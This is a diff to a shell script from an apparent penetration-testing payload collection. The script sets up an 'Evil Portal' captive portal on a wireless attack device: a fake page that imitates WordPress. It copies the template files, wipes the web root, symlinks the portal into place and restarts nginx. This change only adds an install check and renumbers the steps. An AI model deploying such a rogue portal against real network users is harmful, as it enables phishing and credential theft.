@@ -2,7 +2,7 @@
 # Name: WordPress Portal
 # Description: Activates the WordPress captive portal template
 # Author: PentestPlaybook
-# Version: 1.4
+# Version: 1.5
 # Category: Evil Portal
 
 # ====================================================================
@@ -21,9 +21,22 @@ PAYLOAD_DIR="/root/payloads/user/evil_portal/wordpress_portal"
 PORTAL_DIR="/root/portals/Wordpress"
 
 # ====================================================================
-# STEP 0: Backwards Compatibility Check
+# STEP 0: Verify Evil Portal is Installed
 # ====================================================================
-LOG "Step 0: Checking for backwards compatibility..."
+LOG "Step 0: Verifying Evil Portal is installed..."
+
+if [ ! -f "/etc/init.d/evilportal" ]; then
+    LOG "ERROR: Evil Portal is not installed"
+    LOG "Please run the 'Install Evil Portal' payload first"
+    exit 1
+fi
+
+LOG "SUCCESS: Evil Portal is installed"
+
+# ====================================================================
+# STEP 1: Backwards Compatibility Check
+# ====================================================================
+LOG "Step 1: Checking for backwards compatibility..."
 
 if [ -d "/root/portals/Wordpress" ] && [ ! -d "/root/portals/Default" ]; then
     LOG "Detected legacy installation: Wordpress exists but Default does not"
@@ -61,9 +74,9 @@ EOF
 fi
 
 # ====================================================================
-# STEP 1: Verify Payload Files Exist
+# STEP 2: Verify Payload Files Exist
 # ====================================================================
-LOG "Step 1: Verifying payload files..."
+LOG "Step 2: Verifying payload files..."
 
 if [ ! -d "${PAYLOAD_DIR}/files" ]; then
     LOG "ERROR: files/ directory not found in payload directory"
@@ -78,9 +91,9 @@ fi
 LOG "SUCCESS: Payload files verified"
 
 # ====================================================================
-# STEP 2: Create Wordpress Portal Directory
+# STEP 3: Create Wordpress Portal Directory
 # ====================================================================
-LOG "Step 2: Setting up Wordpress portal directory..."
+LOG "Step 3: Setting up Wordpress portal directory..."
 
 mkdir -p "${PORTAL_DIR}/images"
 mkdir -p "${PORTAL_DIR}/wp-includes/fonts"
@@ -101,9 +114,9 @@ cp "${PAYLOAD_DIR}/files/wp-includes/fonts/"* "${PORTAL_DIR}/wp-includes/fonts/"
 LOG "SUCCESS: Portal files copied"
 
 # ====================================================================
-# STEP 3: Create Captive Portal Detection Files
+# STEP 4: Create Captive Portal Detection Files
 # ====================================================================
-LOG "Step 3: Creating captive portal detection files..."
+LOG "Step 4: Creating captive portal detection files..."
 
 cat > "${PORTAL_DIR}/generate_204.html" << EOF
 <!DOCTYPE html>
@@ -134,9 +147,9 @@ EOF
 LOG "SUCCESS: Detection files created"
 
 # ====================================================================
-# STEP 4: Activate Portal via Symlinks
+# STEP 5: Activate Portal via Symlinks
 # ====================================================================
-LOG "Step 4: Activating Wordpress portal via symlinks..."
+LOG "Step 5: Activating Wordpress portal via symlinks..."
 
 # Clear /www
 rm -rf /www/*
@@ -174,9 +187,9 @@ ln -sf /pineapple/ui/modules/evilportal/assets/api /www/captiveportal
 LOG "SUCCESS: Portal activated via symlinks"
 
 # ====================================================================
-# STEP 5: Restart nginx
+# STEP 6: Restart nginx
 # ====================================================================
-LOG "Step 5: Restarting nginx..."
+LOG "Step 6: Restarting nginx..."
 
 nginx -t
 if [ $? -ne 0 ]; then
@@ -191,7 +204,7 @@ LOG "SUCCESS: nginx restarted"
 # ====================================================================
 # Verification
 # ====================================================================
-LOG "Step 6: Verifying installation..."
+LOG "Step 7: Verifying installation..."
 
 if curl -s http://${PORTAL_IP}/ | grep -q "WordPress"; then
     LOG "SUCCESS: Wordpress portal is responding"
